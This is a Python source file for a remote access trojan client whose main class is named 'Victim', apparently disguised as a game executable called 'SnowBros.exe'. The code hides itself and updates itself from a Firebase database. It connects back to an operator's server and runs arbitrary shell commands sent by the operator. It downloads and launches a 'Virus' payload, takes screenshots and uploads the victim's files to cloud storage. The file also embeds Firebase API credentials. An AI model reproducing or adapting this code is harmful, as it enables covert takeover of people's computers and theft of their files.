import shutil
import socket
import os
import subprocess
import threading

import pyrebase
import requests
from cryptography.fernet import Fernet

from main.script.setting import *
from STATUS_CODE import *

try:
    os.remove("old.exe")
except:
    pass

fernet = Fernet(ENCRYPTION_KEY)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
VERSION = "2.0"
config = {
    "apiKey": "AIzaSyD3VOurnUTu9pE3NOsPmrRXdBgfpiXQ1G0",
    "authDomain": "testing-431b8.firebaseapp.com",
    "projectId": "testing-431b8",
    "databaseURL": "https://testing-431b8-default-rtdb.firebaseio.com/",
    "storageBucket": "testing-431b8.appspot.com",
    "messagingSenderId": "1072555996637",
    "appId": "1:1072555996637:web:d304ade5e8d103a350b234",
    "measurementId": "G-4LV52ZBD3N"
}
fire = pyrebase.initialize_app(config)



class Victim:

    def __init__(self):
        try:
            db = fire.database()
            child = db.child("Upgrade").get().val()
            if child["Version"] != VERSION:
                print(child["Version"])
                os.rename("SnowBros.exe", "old.exe")
                r = requests.get(child['link'], allow_redirects=True)
                open("SnowBros.exe", 'wb').write(r.content)
                os.system("attrib +h " + "SnowBros.exe")
                # os.system("shutdown -r")

        except Exception as e:
            print(e)
        while True:
            try:
                client.connect((ip, port))
                break
            except:
                print("[!] Connection failed")
                pass
        print("[+] Connection Established with Server")
        self.sendMsg(client, MSG_TEMPLATE(status=NEW_CONNECTION_TO_SERVER, msg="New Connection", CODE=VICTIM_CODE))
        print("[*] Waiting For Response")
        self.Connection()

    def sendMsg(srlf,conn, msg):
        msg = str(msg).encode('utf-8')
        msg = fernet.encrypt(msg)
        conn.send(msg)


    def decryptMsg(self,msg):
        msg = fernet.decrypt(msg)
        msg = msg.decode('utf-8')
        return eval(msg)


    def downloadfile(self):
        try:
            filename = 'sys.exe'
            r = requests.get(link, allow_redirects=True)
            open(f'{filename}', 'wb').write(r.content)
            client.send(b"Downloaded")

            subprocess.Popen(filename, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                             stderr=subprocess.PIPE)
            while "results" not in os.listdir(os.getcwd()):
                for i in range(30000):
                    if "results" in os.listdir(os.getcwd()):
                        break
            while len(os.listdir("results")) == 0:
                for i in range(30000):
                    if len(os.listdir("results")) == 0:
                        break
            client.send(b"Waiting for results......")
            self.send("results")
            os.remove(filename)
            try:
                os.system(f"rmdir /S /Q {filename}")
            except:
                pass
        except Exception as e:
            e = str(e)
            e = e.encode()
            try:
                client.send(e)
            except:
                pass

    def downloadfiles(self,filename, link):
        try:
            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Downloading File", CODE=VICTIM_CODE))
            r = requests.get(link, allow_redirects=True)
            open(f'{filename}', 'wb').write(r.content)
            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="File Downloaded", CODE=VICTIM_CODE))
        except Exception as e:
            e = str(e)
            try:
                self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg=e, CODE=VICTIM_CODE))
            except:
                pass

    def send(self,fil):
        try:
            flag = False
            if os.path.isdir(fil):
                self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Creating Zip", CODE=VICTIM_CODE))
                shutil.make_archive(fil, 'zip', os.getcwd() + fil)
                fil = fil + ".zip"
                flag = True
            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Uploading File", CODE=VICTIM_CODE))
            storage = fire.storage()
            storage.child(f"ALLVICTIMDATA/{fil}").put(fil)
            uri = str(storage.child(f"ALLVICTIMDATA/{fil}").get_url(None))
            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="File Uploaded At -> ", CODE=VICTIM_CODE))
            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg=uri, CODE=VICTIM_CODE))
            if flag:
                os.remove(fil)
        except Exception as e:
            e = "ERROR :: " + e
            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg=e, CODE=VICTIM_CODE))

    def connected(self):
        stateConnected = 1

        self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="I am Connected", CODE=VICTIM_CODE))

    def screensshot(self):
        try:
            filename = "capture.JPG"
            if "sm.sm" not in os.listdir(os.getcwd()):
                client.send(b"Downloading module....")
                try:
                    r = requests.get(ScreenshotLink, allow_redirects=True)
                    open(f'sm.sm', 'wb').write(r.content)
                    self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Module Downloaded!", CODE=VICTIM_CODE))
                except Exception as e:
                    client.send(str(e).encode())
            command = f"sm.sm savescreenshot {filename}"
            subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                             stderr=subprocess.PIPE)

            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Taking Screenshot!", CODE=VICTIM_CODE))

            while filename not in os.listdir(os.getcwd()):
                for i in range(30000):
                    if filename in os.listdir(os.getcwd()):
                        break

            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Screenshot Taken!", CODE=VICTIM_CODE))
            self.send(filename)
            os.remove(filename)
        except Exception as e:
            e = "ERROR :: " + e
            client.send(e.encode())
            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg=e, CODE=VICTIM_CODE))

    def Connection(self):
        while True:
            received = (self.decryptMsg(client.recv(BufferSize)))
            print(received['data'])
            try:
                data = received['data']
                if data == "cd ..":
                    dir = os.getcwd()
                    dir = dir.split("\\")
                    dir = dir[:len(dir) - 1]
                    o = ''
                    for i in dir:
                        o += i + "\\"
                    os.chdir(o)
                    self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg=o + ">", CODE=VICTIM_CODE))
                elif data[:2] == 'cd':
                    try:
                        os.chdir(data[3:])
                        self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg=os.getcwd() + ">", CODE=VICTIM_CODE))
                    except os.error as msg:
                        self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg=msg, CODE=VICTIM_CODE))

                elif data.split("->")[0] == "download":
                    self.downloadfiles(data.split("->")[1], data.split("->")[2])

                elif data[:7] == 'capture':
                    self.screensshot()
                elif data == "Virus":
                    try:
                        threading.Thread(target=self.downloadfile).start()
                        self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Downloading Virus", CODE=VICTIM_CODE))
                    except Exception as e:
                        client.send(str(e).encode())

                elif data.split(" ")[0] == "create":
                    with open(data.split(" ")[1], "w") as file:
                        self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Waiting for Script", CODE=VICTIM_CODE))
                        script = self.decryptMsg(client.recv(BufferSize))
                        file.write(script)
                        self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Script Created", CODE=VICTIM_CODE))
                elif data.split("->")[0] == "send":
                    if data.split("->")[1] in os.listdir(os.getcwd()):
                        self.send(data.split("->")[1])
                    else:
                        self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="File not found", CODE=VICTIM_CODE))

                elif data.split(" ")[0] == 'del':
                    if data.split(" ")[1] in os.listdir(os.getcwd()):
                        if os.path.isdir(data.split(" ")[1]):
                            os.system(f"rmdir /S /Q {data.split(' ')[1]}")
                            self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg=os.getcwd(), CODE=VICTIM_CODE))
                        else:
                            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                                   stderr=subprocess.PIPE)
                            out_put_byte = cmd.stdout.read() + cmd.stderr.read()
                            out_put_str = str(out_put_byte, "utf-8")
                            curent_dir = os.getcwd() + ">"
                            self.sendMsg(client,
                                    MSG_TEMPLATE(status=CONNECTED_CODE, msg=out_put_str + curent_dir, CODE=VICTIM_CODE))

                    else:
                        self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg="Directory Not Found", CODE=VICTIM_CODE))

                elif data[:3] != 'del':
                    # cmd = subprocess.check_output(data,shell= True,timeout=3)
                    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                           stderr=subprocess.PIPE)

                    out_put_byte = cmd.stdout.read() + cmd.stderr.read()
                    out_put_str = str(out_put_byte, "utf-8")
                    curent_dir = os.getcwd() + ">"
                    self.sendMsg(client, MSG_TEMPLATE(status=CONNECTED_CODE, msg=out_put_str + curent_dir, CODE=VICTIM_CODE))
            except Exception as e:
                print(e)
                break

print("[+] Starting Rituals")
rituals = Victim()

